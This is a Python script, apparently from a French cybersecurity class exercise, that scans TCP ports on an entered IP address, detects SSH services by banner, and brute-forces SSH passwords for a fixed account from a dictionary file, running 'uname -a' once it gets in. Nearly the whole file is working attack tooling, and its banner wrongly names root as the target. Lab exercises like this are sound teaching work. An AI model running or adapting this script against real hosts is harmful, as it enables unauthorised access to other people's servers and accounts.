#!/usr/bin/env python3
import sys
import socket
import threading
import time
import subprocess
import os

# Chemin fixe pour le fichier de mots de passe
DICTIONARY_PATH = r"C:\Users\stagiaire\Documents\cours cyber\github\Cybersec\TP-01\passwords.txt"

# Configuration
THREAD_LIMIT = 50
SSH_TIMEOUT = 5
SCAN_TIMEOUT = 1
SSH_USERNAME = "doranco"  # Compte cible pour le brute force


def install_dependencies():
    """Installe les dépendances requises automatiquement"""
    try:
        import paramiko
    except ImportError:
        print("[!] Installation du module 'paramiko'...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "paramiko"])
            print("[+] Installation réussie")
            import paramiko
        except Exception as e:
            print(f"[ERREUR] Impossible d'installer paramiko: {e}")
            sys.exit(1)


install_dependencies()
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, SSHException


def scan_port(host, port, open_ports):
    """Scan un port unique et ajoute aux résultats si ouvert"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(SCAN_TIMEOUT)
            result = s.connect_ex((host, port))
            if result == 0:
                service = get_service_banner(host, port)
                print(f"[+] Port {port}/tcp ouvert - {service}")
                open_ports.append((port, service))
    except Exception as e:
        print(f"[-] Erreur sur le port {port}: {str(e)[:100]}")


def get_service_banner(host, port):
    """Tente d'obtenir le banner du service"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(SCAN_TIMEOUT)
            s.connect((host, port))
            banner = s.recv(1024).decode(errors='ignore').strip()
            return banner if banner else "Service non identifié"
    except:
        return "Service non identifié"


def load_passwords():
    """Charge les mots de passe depuis le fichier fixe"""
    try:
        with open(DICTIONARY_PATH, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
            if not passwords:
                print("[ERREUR] Le fichier passwords.txt est vide")
                sys.exit(1)
            return passwords
    except FileNotFoundError:
        print(f"[ERREUR] Fichier introuvable: {DICTIONARY_PATH}")
        print("Veuillez créer le fichier passwords.txt avec un mot de passe par ligne")
        sys.exit(1)


def brute_force_ssh(host, port, passwords):
    """Effectue une attaque brute force SSH"""
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())

    print(f"\n[ATTACK] Attaque sur {host}:{port} (compte: {SSH_USERNAME})")

    for password in passwords:
        try:
            print(f"[>] Test: {password[:20]}{'...' if len(password) > 20 else ''}", end='\r', flush=True)

            ssh.connect(host, port=port, username=SSH_USERNAME,
                        password=password, timeout=SSH_TIMEOUT,
                        banner_timeout=SSH_TIMEOUT)

            print("\n" + "=" * 50)
            print(f"[SUCCÈS] Connexion établie! {SSH_USERNAME}:{password}")
            print(f"Commande SSH: ssh {SSH_USERNAME}@{host} -p {port}")

            # Exécution d'une commande de test
            stdin, stdout, stderr = ssh.exec_command('uname -a')
            print(f"Système: {stdout.read().decode().strip()}")
            print("=" * 50)

            ssh.close()
            return True

        except AuthenticationException:
            continue
        except (SSHException, socket.error) as e:
            print(f"\n[!] Erreur réseau: {str(e)[:100]}")
            time.sleep(5)
            continue
        except Exception as e:
            print(f"\n[!] Erreur inattendue: {str(e)[:100]}")
            continue

    print("\n[!] Aucun mot de passe valide trouvé")
    return False


def main():
    print("""
    ###########################################
    #  Scanner de ports + Brute Force SSH     #
    #  Cible: compte root                     #
    #  Chemin dictionnaire:                   #
    #  """ + DICTIONARY_PATH + """
    ###########################################
    """)

    # Chargement des mots de passe
    passwords = load_passwords()

    # Configuration
    target = input("Adresse IP cible: ").strip()
    start_port = int(input("Port de début [1]: ") or 1)
    end_port = int(input("Port de fin [1024]: ") or 1024)

    # Phase 1: Scan de ports
    print(f"\n[PHASE 1] Scan des ports {start_port}-{end_port}...")
    open_ports = []
    threads = []

    for port in range(start_port, end_port + 1):
        while threading.active_count() > THREAD_LIMIT:
            time.sleep(0.1)

        t = threading.Thread(target=scan_port, args=(target, port, open_ports))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    if not open_ports:
        print("[-] Aucun port ouvert trouvé")
        sys.exit(0)

    # Phase 2: Filtrage des ports SSH
    print("\n[PHASE 2] Filtrage des services SSH...")
    ssh_ports = [port for port, service in open_ports if 'ssh' in service.lower()]

    if not ssh_ports:
        print("[-] Aucun service SSH détecté")
        sys.exit(0)

    # Phase 3: Attaque brute force
    print("\n[PHASE 3] Attaque brute force SSH...")
    for port in ssh_ports:
        if brute_force_ssh(target, port, passwords):
            break


if __name__ == "__main__":
    main()